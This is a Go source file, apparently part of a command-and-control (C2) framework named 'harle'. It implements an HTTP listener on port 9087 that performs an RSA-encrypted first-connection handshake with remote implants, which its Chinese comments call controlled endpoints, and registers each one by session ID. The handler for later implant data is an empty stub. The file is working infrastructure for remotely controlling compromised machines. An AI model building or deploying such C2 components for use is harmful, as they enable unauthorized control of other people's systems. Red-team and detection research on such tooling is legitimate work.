package transport

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"fmt"
	"github.com/google/uuid"
	"github.com/lzkking/harle/server/internal/agent"
	"github.com/lzkking/harle/server/internal/command"
	pkgrsa "github.com/lzkking/harle/server/pkg/crypto/rsa"
	"github.com/lzkking/harle/server/proto/implant"
	"go.uber.org/zap"
	"io"
	"net/http"
	"time"

	"github.com/gorilla/mux"
)

const (
	DefaultHTTPTimeout = time.Minute
)

type ListenerHttpC2 struct {
	Agents *agent.Agents //	管理连接到此处的所有被控端的信息
}

func (s *ListenerHttpC2) router() *mux.Router {
	router := mux.NewRouter()

	router.HandleFunc("/{rpath:.*}", s.mainHandler).Methods(http.MethodGet, http.MethodPost)

	return router
}

func (s *ListenerHttpC2) mainHandler(resp http.ResponseWriter, req *http.Request) {
	//	从头部获取session id
	a := s.getSession(req)
	if a == nil {
		// 处理匿名agent，只做获取其中的公钥的操作，没有的话返回错误码
		s.dealAnonymousData(resp, req)
	} else {
		// 处理被控端传递来的数据
		s.dealData(resp, req)
	}

}

func (s *ListenerHttpC2) dealAnonymousData(resp http.ResponseWriter, req *http.Request) {
	//读取body中的数据
	anonymousEncryptData, err := io.ReadAll(req.Body)
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}
	defer req.Body.Close()

	anonymousData, err := rsa.DecryptOAEP(
		sha256.New(),
		rand.Reader,
		pkgrsa.RsaPrivateKey,
		anonymousEncryptData,
		nil,
	)
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	var commandData implant.CommandData
	err = commandData.Unmarshal(anonymousData)
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	if commandData.DataType != command.FirstConnection {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	agentPublicKey := commandData.Data
	agentId := uuid.New().String()
	a := agent.Agent{
		AgentId:        agentId,
		AgentPublicKey: agentPublicKey,
	}

	serverPublicKey := a.GetServerPublicKey()
	if len(serverPublicKey) == 0 {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	err = a.CalcSessionKey()
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	verify, err := a.EncryptData([]byte("ok"))
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	serverPublicKeyVerify, err := pkgrsa.SignWithPrivateKey(serverPublicKey)
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	firstConnection := implant.FirstConnection{
		SessionId:       agentId,
		PublicKey:       serverPublicKey,
		Verify:          verify,
		PublicKeyVerify: serverPublicKeyVerify,
	}

	var cData implant.CommandData
	cData.DataType = command.FirstConnectionRet
	cData.TimeStamp = time.Now().Format(time.RFC3339)
	byteFirstConnect, err := firstConnection.Marshal()
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}
	cData.Data = byteFirstConnect
	cDataBytes, err := cData.Marshal()
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	resp.WriteHeader(http.StatusOK)
	if _, err = resp.Write(cDataBytes); err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}

	err = s.Agents.Add(agentId, &a)
	if err != nil {
		resp.WriteHeader(http.StatusBadRequest)
		return
	}
}

func (s *ListenerHttpC2) dealData(resp http.ResponseWriter, req *http.Request) {

}

func (s *ListenerHttpC2) getSession(req *http.Request) *agent.Agent {
	sid := req.Header.Get("X-Session-Id")
	if sid == "" {
		return nil
	}
	a := s.Agents.GetAgentById(sid)
	return a
}

func StartHttpListener() {
	server := &ListenerHttpC2{
		Agents: &agent.Agents{
			Agents: make(map[string]*agent.Agent),
		},
	}

	test := &http.Server{
		Addr:         fmt.Sprintf("%s:%d", "0.0.0.0", 9087),
		Handler:      server.router(),
		WriteTimeout: DefaultHTTPTimeout,
		ReadTimeout:  DefaultHTTPTimeout,
		IdleTimeout:  DefaultHTTPTimeout,
	}

	if err := test.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		zap.S().Fatalf("ListenAndServe error: %v", err)
	}
}
